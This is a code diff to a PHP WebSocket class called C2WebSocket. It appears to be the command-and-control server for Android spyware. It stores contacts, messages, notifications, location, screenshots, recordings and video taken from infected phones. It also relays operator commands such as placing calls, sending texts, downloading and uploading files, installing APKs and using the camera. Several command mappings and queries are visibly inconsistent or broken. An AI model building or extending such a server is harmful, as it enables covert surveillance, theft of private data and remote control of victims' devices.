@@ -24,33 +24,57 @@ class C2WebSocket implements MessageComponentInterface {
     public function onOpen(ConnectionInterface $conn)
     {
         $this->clients->attach($conn);
-        if (isset($this->server))
-            $this->server->send(time() . " Connection estbalished by " . $conn->resourceId);
+        if (isset($this->server)) {
+            $currentDateTime = date('Y-m-d H:i:s');
+            $response = [
+                "color" => "btn-success",
+                "message" => $currentDateTime . ": Connection estbalished by " . $conn->resourceId
+            ];
+            $this->server->send(json_encode($response));
+        }
     }
 
     public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
     {
-        $data = json_decode($msg->getContents());
-        var_dump($msg);
+        $data = json_decode($msg->getPayload());
 
-        if ($data['type'] === 'client')
+        if ($data === null)
+            return;
+
+        if ($data->type === "js-server") {
+            $this->server = $conn;
+            $currentDateTime = date('Y-m-d H:i:s');
+            $response = [
+                "color" => "text-success",
+                "message" => $currentDateTime . ": Connection established successfully"
+            ];
+            $conn->send(json_encode($response));
+        } elseif ($data->type === 'client')
             $this->clientConnection($conn, $data);
-        
-        if ($data['type'] === 'server')
+        elseif ($data->type === 'server')
             $this->serverConnection($conn, $data);
 
-        if ($data === "js server")
-            $this->server = $conn;
-
-        if (isset($this->server))
-            $this->server->send(time() . " " . $data);
+        if (isset($this->server)) {
+            $currentDateTime = date('Y-m-d H:i:s');
+            $response = [
+                "color" => "text-light",
+                "message" => $currentDateTime . ": " . json_encode($data)
+            ];
+            $this->server->send(json_encode($response));
+        }
     }
 
     public function onClose(ConnectionInterface $conn)
     {
         $this->clients->detach($conn);
-        if (isset($this->server))
-            $this->server->send(time() . " Connection closed by " . $conn->resourceId);
+        if (isset($this->server)) {
+            $currentDateTime = date('Y-m-d H:i:s');
+            $response = [
+                "color" => "text-danger",
+                "message" => $currentDateTime . ": Connection closed by " . $conn->resourceId
+            ];
+            $this->server->send(json_encode($response));
+        }
     }
 
     public function onError(ConnectionInterface $conn, \Exception $e)
@@ -62,63 +86,63 @@ class C2WebSocket implements MessageComponentInterface {
      * Handle client connections
      * 
      * @param ConnectionInterface $conn
-     * @param array $data
+     * @param $data
      */
-    private function clientConnection(ConnectionInterface $conn, array $data): void
+    private function clientConnection(ConnectionInterface $conn, $data): void
     {
-        $clientID = $data['id'];
+        $clientID = $data->id;
         $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId); //???????
 
         switch ($data['res']) {
             case "contact":
                 $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
-                $name = base64_decode($data['name']);
-                $number = base64_decode($data['number']);
+                $name = base64_decode($data->name);
+                $number = base64_decode($data->number);
                 $this->database->insert($query, [$clientID, $name, $number]);
                 break;
             case "image":
                 $query = "INSERT INTO IMAGE(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data['filename']);
-                $timestamp = $data['timestamp'];
+                $filename = base64_decode($data->filename);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             case "location":
                 $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
-                $latitude = base64_decode($data['latitude']);
-                $longitude = base64_decode($data['longitude']);
-                $altitude = base64_decode($data['altitude']);
+                $latitude = base64_decode($data->latitude);
+                $longitude = base64_decode($data->longitude);
+                $altitude = base64_decode($data->altitude);
                 $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude]);
                 break;
             case "message":
                 $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
-                $sender = base64_decode($data['sender']);
-                $content = base64_decode($data['content']);
-                $timestamp = $data['timestamp'];
+                $sender = base64_decode($data->sender);
+                $content = base64_decode($data->content);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$sender, $content, $timestamp]);
                 break;
             case "notification":
                 $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
-                $sender = base64_decode($data['sender']);
-                $content = base64_decode($data['content']);
-                $timestamp = $data['timestamp'];
+                $sender = base64_decode($data->sender);
+                $content = base64_decode($data->content);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
                 break;
             case "recording":
                 $query = "INSERT INTO RECORDING(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data['filename']);
-                $timestamp = $data['timestamp'];
+                $filename = base64_decode($data->filename);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             case "screesnshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data['filename']);
-                $timestamp = $data['timestamp'];
+                $filename = base64_decode($data->filename);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             case "video":
                 $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data['filename']);
-                $timestamp = $data['timestamp'];
+                $filename = base64_decode($data->filename);
+                $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             default:
@@ -130,11 +154,11 @@ class C2WebSocket implements MessageComponentInterface {
      * Handle connections from the server
      * 
      * @param ConnectionInterface $conn
-     * @param array $data
+     * @param $data
      */
-    private function serverConnection(ConnectionInterface $conn, array $data): void
+    private function serverConnection(ConnectionInterface $conn, $data): void
     {
-        $clientWebSocketID = $data['web_socket_id'];
+        $clientWebSocketID = $data->web_socket_id;
         $client = $this->getClient($clientWebSocketID);
         
         if (is_null($client))
@@ -143,11 +167,11 @@ class C2WebSocket implements MessageComponentInterface {
         $json = null;
 
         if ($this->isClientConnected($clientWebSocketID)) {
-            switch ($data['cmd']) {
+            switch ($data->cmd) {
                 case "CALL":
                     $json = json_encode([
                         "cmd" => "CALL",
-                        "number" => $data['number'],
+                        "number" => $data->number,
                     ]);
                     break;
                 case "CAMERA_BACK":
@@ -159,27 +183,27 @@ class C2WebSocket implements MessageComponentInterface {
                 case "DELETE_CONTACT":
                     $json = json_encode([
                         "cmd" => "DOWNLOAD_FILE",
-                        "name" => $data['name'],
-                        "number" => $data['number']
+                        "name" => $data->name,
+                        "number" => $data->number
                     ]);
                     break;
                 case "DOWNLOAD_FILE":
                     $json = json_encode([
                         "cmd" => "DOWNLOAD_FILE",
-                        "url" => $data['url'],
-                        "filename" => $data['filename']
+                        "url" => $data->url,
+                        "filename" => $data->filename
                     ]);
                     break;
                 case "INSTALL_APK":
                     $json = json_encode([
                         "cmd" => "INSTALL_APK",
-                        "path" => $data['path']
+                        "path" => $data->path
                     ]);
                     break;
                 case "LAUNCH_APP":
                     $json = json_encode([
                         "cmd" => "LAUNCH_APP",
-                        "package" => $data['package']
+                        "package" => $data->package
                     ]);
                     break;
                 case "LIST_INSTALLED_APPS":
@@ -188,7 +212,7 @@ class C2WebSocket implements MessageComponentInterface {
                 case "LIST_FILES":
                     $json = json_encode([
                         "cmd" => "VIDEO",
-                        "path" => $data['path']
+                        "path" => $data->path
                     ]);
                     break;
                 case "LOCATION":
@@ -203,15 +227,15 @@ class C2WebSocket implements MessageComponentInterface {
                 case "TEXT":
                     $json = json_encode([
                         "cmd" => "WRITE_CONTACT",
-                        "number" => $data['number'],
-                        "message" => $data['message']
+                        "number" => $data->number,
+                        "message" => $data->message
                     ]);
                     break;
                 case "UPLOAD_FILE":
                     $json = json_encode([
                         "cmd" => "WRITE_CONTACT",
-                        "path" => $data['path'],
-                        "url" => $data['url']
+                        "path" => $data->path,
+                        "url" => $data->url
                     ]);
                     break;
                 case "VIDEO":
@@ -220,8 +244,8 @@ class C2WebSocket implements MessageComponentInterface {
                 case "WRITE_CONTACT":
                     $json = json_encode([
                         "cmd" => "WRITE_CONTACT",
-                        "name" => $data['name'],
-                        "number" => $data['number']
+                        "name" => $data->name,
+                        "number" => $data->number
                     ]);
                     break;
                 default;
